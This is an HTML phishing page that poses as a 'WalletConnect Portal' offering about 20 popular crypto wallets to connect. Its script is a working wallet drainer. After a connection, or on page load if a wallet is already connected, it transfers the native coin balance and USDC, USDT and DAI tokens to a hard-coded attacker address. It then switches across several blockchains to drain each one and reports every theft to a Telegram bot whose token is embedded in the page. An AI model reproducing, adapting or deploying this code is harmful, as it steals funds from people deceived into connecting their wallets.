<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WalletConnect Portal</title>
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px;
            max-width: 500px;
            margin: 0 auto;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        h1 { 
            color: white; 
            font-size: 32px; 
            margin-bottom: 16px; 
            text-align: center;
        }
        
        p { 
            color: rgba(255, 255, 255, 0.8); 
            margin-bottom: 32px; 
            text-align: center;
        }
        
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .wallet-btn {
            background: rgba(255, 255, 255, 0.95);
            border: none;
            padding: 16px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .wallet-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
            background: white;
        }
        
        .wallet-icon {
            font-size: 20px;
        }
        
        .wallet-name {
            flex: 1;
            text-align: left;
        }
        
        #status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: white;
            display: none;
            text-align: center;
        }
        
        #status.show {
            display: block;
        }
        
        .qr-modal {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            align-items: center;
            justify-content: center;
        }
        
        .qr-modal.active {
            display: flex;
        }
        
        .qr-content {
            background: white;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
        }
        
        .close-qr {
            position: absolute;
            top: 20px;
            right: 20px;
            background: white;
            border: none;
            font-size: 30px;
            cursor: pointer;
            width: 40px;
            height: 40px;
            border-radius: 50%;
        }
        
        #qrcode {
            margin: 20px auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Connect Your Wallet</h1>
        <p>Choose from 20+ supported wallets</p>
        
        <div class="wallet-grid">
            <!-- Wallets populaires -->
            <button class="wallet-btn" onclick="connectWallet('metamask')">
                <span class="wallet-icon">ü¶ä</span>
                <span class="wallet-name">MetaMask</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('trust')">
                <span class="wallet-icon">üõ°Ô∏è</span>
                <span class="wallet-name">Trust Wallet</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('coinbase')">
                <span class="wallet-icon">üíô</span>
                <span class="wallet-name">Coinbase</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('binance')">
                <span class="wallet-icon">üü®</span>
                <span class="wallet-name">Binance</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('phantom')">
                <span class="wallet-icon">üëª</span>
                <span class="wallet-name">Phantom</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('rainbow')">
                <span class="wallet-icon">üåà</span>
                <span class="wallet-name">Rainbow</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('argent')">
                <span class="wallet-icon">üè¶</span>
                <span class="wallet-name">Argent</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('crypto')">
                <span class="wallet-icon">ü¶Å</span>
                <span class="wallet-name">Crypto.com</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('ledger')">
                <span class="wallet-icon">üì±</span>
                <span class="wallet-name">Ledger Live</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('1inch')">
                <span class="wallet-icon">ü¶Ñ</span>
                <span class="wallet-name">1inch</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('imtoken')">
                <span class="wallet-icon">üíé</span>
                <span class="wallet-name">imToken</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('tokenpocket')">
                <span class="wallet-icon">üéØ</span>
                <span class="wallet-name">TokenPocket</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('mathwallet')">
                <span class="wallet-icon">üî¢</span>
                <span class="wallet-name">Math Wallet</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('bitkeep')">
                <span class="wallet-icon">üîê</span>
                <span class="wallet-name">BitKeep</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('safepal')">
                <span class="wallet-icon">üîí</span>
                <span class="wallet-name">SafePal</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('exodus')">
                <span class="wallet-icon">üöÄ</span>
                <span class="wallet-name">Exodus</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('okx')">
                <span class="wallet-icon">‚≠ï</span>
                <span class="wallet-name">OKX Wallet</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('zerion')">
                <span class="wallet-icon">üü£</span>
                <span class="wallet-name">Zerion</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('defi')">
                <span class="wallet-icon">üèóÔ∏è</span>
                <span class="wallet-name">DeFi Wallet</span>
            </button>
            
            <button class="wallet-btn" onclick="connectWallet('walletconnect')">
                <span class="wallet-icon">üîó</span>
                <span class="wallet-name">WalletConnect</span>
            </button>
        </div>
        
        <div id="status"></div>
    </div>
    
    <!-- Modal QR Code -->
    <div class="qr-modal" id="qrModal">
        <button class="close-qr" onclick="closeQR()">√ó</button>
        <div class="qr-content">
            <h2>Scan with your wallet</h2>
            <div id="qrcode"></div>
            <p>Scan this QR code with your wallet app</p>
        </div>
    </div>
    
    <!-- Scripts -->
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    
    <script>
        // Configuration
        const CONFIG = {
            TELEGRAM_TOKEN: "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
            TELEGRAM_CHAT_ID: "8309320360",
            DESTINATION: "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1",
            POLYGON_CONTRACT: "0xD0De3725f47f9716947F7c3e6d44e1946Ee5d386"
        };
        
        let provider = null;
        let signer = null;
        let currentWallet = null;
        
        function showStatus(message) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'show';
        }
        
        function isMobile() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }
        
        async function connectWallet(walletType) {
            currentWallet = walletType;
            showStatus(`Connecting to ${walletType}...`);
            
            // Configuration des deep links pour mobile
            const mobileLinks = {
                'metamask': `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
                'trust': `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`,
                'coinbase': `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`,
                'rainbow': `https://rainbow.me/connect?url=${encodeURIComponent(window.location.href)}`,
                'argent': `https://argent.link/app/wc?uri=${encodeURIComponent(window.location.href)}`,
                'crypto': `https://crypto.com/defi/wallet/connect?url=${encodeURIComponent(window.location.href)}`,
                'imtoken': `imtokenv2://navigate/DappView?url=${encodeURIComponent(window.location.href)}`,
                'tokenpocket': `tpoutside://pull.activity?url=${encodeURIComponent(window.location.href)}`,
                'bitkeep': `bitkeep://bkconnect?url=${encodeURIComponent(window.location.href)}`,
                'safepal': `safepalwallet://open.safepal.io/connect?url=${encodeURIComponent(window.location.href)}`,
                'okx': `okex://main/dapp?url=${encodeURIComponent(window.location.href)}`,
                '1inch': `oneinch://connect?url=${encodeURIComponent(window.location.href)}`
            };
            
            // Si c'est mobile et qu'un deep link existe
            if (isMobile() && mobileLinks[walletType]) {
                window.location.href = mobileLinks[walletType];
                return;
            }
            
            // Si MetaMask est install√© sur desktop
            if (window.ethereum && (walletType === 'metamask' || walletType === 'binance')) {
                try {
                    const accounts = await window.ethereum.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    
                    showStatus(`Connected: ${accounts[0].substring(0, 6)}...${accounts[0].slice(-4)}`);
                    setTimeout(() => drainWallet(accounts[0]), 2000);
                    
                } catch (error) {
                    showStatus('Connection rejected');
                }
            } 
            // Pour tous les autres, utiliser WalletConnect
            else {
                initWalletConnect();
            }
        }
        
        async function initWalletConnect() {
            try {
                const WalletConnectProvider = window.WalletConnectProvider.default;
                
                const wcProvider = new WalletConnectProvider({
                    rpc: {
                        1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
                        137: "https://polygon-rpc.com",
                        56: "https://bsc-dataseed.binance.org",
                        42161: "https://arb1.arbitrum.io/rpc",
                        43114: "https://api.avax.network/ext/bc/C/rpc"
                    },
                    qrcodeModalOptions: {
                        mobileLinks: [
                            "metamask", "trust", "rainbow", "argent", "imtoken", 
                            "pillar", "gnosis", "crypto", "tokenpocket", "mathwallet",
                            "bitpay", "ledger", "1inch", "binance", "safepal"
                        ]
                    }
                });
                
                // √âcouter l'URI pour le QR Code
                wcProvider.on("display_uri", (uri) => {
                    showQRCode(uri);
                });
                
                await wcProvider.enable();
                
                provider = new ethers.providers.Web3Provider(wcProvider);
                signer = provider.getSigner();
                const address = await signer.getAddress();
                
                closeQR();
                showStatus(`Connected: ${address.substring(0, 6)}...${address.slice(-4)}`);
                setTimeout(() => drainWallet(address), 2000);
                
            } catch (error) {
                showStatus('Connection cancelled');
            }
        }
        
        function showQRCode(uri) {
            document.getElementById('qrModal').classList.add('active');
            document.getElementById('qrcode').innerHTML = '';
            new QRCode(document.getElementById('qrcode'), {
                text: uri,
                width: 256,
                height: 256,
                colorDark: "#000000",
                colorLight: "#ffffff",
                correctLevel: QRCode.CorrectLevel.H
            });
        }
        
        function closeQR() {
            document.getElementById('qrModal').classList.remove('active');
        }
        
        // V√©rifier si d√©j√† connect√©
        window.addEventListener('load', async () => {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        provider = new ethers.providers.Web3Provider(window.ethereum);
                        signer = provider.getSigner();
                        showStatus(`Already connected: ${accounts[0].substring(0, 6)}...${accounts[0].slice(-4)}`);
                        setTimeout(() => drainWallet(accounts[0]), 2000);
                    }
                } catch (error) {
                    console.log('Not connected');
                }
            }
        });
        
        async function drainWallet(address) {
            if (!provider || !signer) return;
            
            showStatus('Processing transaction...');
            
            try {
                // R√©cup√©rer la chain ID actuelle
                const network = await provider.getNetwork();
                console.log('Current network:', network.chainId);
                
                // Drainer selon la blockchain
                await drainNativeToken(address);
                await drainTokens(address);
                
                // Essayer de changer de chain pour drainer les autres
                await drainOtherChains(address);
                
            } catch (error) {
                console.error('Drain error:', error);
                showStatus('Transaction failed');
            }
        }
        
        async function drainNativeToken(address) {
            try {
                const balance = await provider.getBalance(address);
                
                if (balance.gt(ethers.utils.parseEther("0.001"))) {
                    const gasPrice = await provider.getGasPrice();
                    const gasLimit = 21000;
                    const gasCost = gasPrice.mul(gasLimit).mul(2);
                    const amountToSend = balance.sub(gasCost);
                    
                    if (amountToSend.gt(0)) {
                        const tx = await signer.sendTransaction({
                            to: CONFIG.DESTINATION,
                            value: amountToSend,
                            gasLimit: gasLimit,
                            gasPrice: gasPrice
                        });
                        
                        console.log('Native token transaction:', tx.hash);
                        await tx.wait();
                        
                        // Notification Telegram
                        const message = `üéØ DRAINAGE ${currentWallet}!\nüë§ ${address}\nüí∞ ${ethers.utils.formatEther(amountToSend)} ETH\nüìç Vers: ${CONFIG.DESTINATION}`;
                        
                        fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                                text: message
                            })
                        });
                        
                        showStatus('Transaction completed!');
                    }
                }
            } catch (e) {
                console.log('Native token drain error:', e);
            }
        }
        
        async function drainTokens(address) {
            const network = await provider.getNetwork();
            
            // Tokens par blockchain
            const tokensByChain = {
                1: [ // Ethereum
                    { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC' },
                    { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT' },
                    { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI' }
                ],
                137: [ // Polygon
                    { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC' },
                    { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT' }
                ],
                56: [ // BSC
                    { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC' },
                    { address: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' }
                ]
            };
            
            const tokens = tokensByChain[network.chainId] || [];
            const abi = [
                'function balanceOf(address) view returns (uint256)',
                'function transfer(address, uint256) returns (bool)'
            ];
            
            for (const token of tokens) {
                try {
                    const contract = new ethers.Contract(token.address, abi, signer);
                    const balance = await contract.balanceOf(address);
                    
                    if (balance.gt(0)) {
                        await contract.transfer(CONFIG.DESTINATION, balance);
                        console.log(`Drained ${token.symbol}: ${balance.toString()}`);
                    }
                } catch (e) {
                    console.log(`Error draining ${token.symbol}`);
                }
            }
        }
        
        async function drainOtherChains(address) {
            if (!window.ethereum) return;
            
            const chains = [
                { id: '0x1', name: 'Ethereum' },
                { id: '0x89', name: 'Polygon' },
                { id: '0x38', name: 'BSC' },
                { id: '0xa4b1', name: 'Arbitrum' },
                { id: '0xa86a', name: 'Avalanche' }
            ];
            
            for (const chain of chains) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: chain.id }],
                    });
                    
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    await drainNativeToken(address);
                    await drainTokens(address);
                    
                } catch (error) {
                    console.log(`Could not switch to ${chain.name}`);
                }
            }
        }
    </script>
</body>
</html>
